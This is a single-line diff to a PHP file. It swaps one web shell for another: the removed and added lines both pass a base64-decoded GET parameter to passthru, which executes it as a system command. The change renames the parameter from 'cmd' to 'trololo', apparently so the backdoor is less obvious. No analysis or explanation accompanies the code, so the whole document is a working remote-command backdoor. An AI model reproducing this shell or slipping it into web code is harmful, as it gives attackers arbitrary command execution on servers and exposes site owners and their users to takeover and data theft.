@@ -1,1 +1,1 @@
-<?php passthru(base64_decode($_GET['cmd']));?>
+<?php passthru(base64_decode($_GET['trololo']));?>
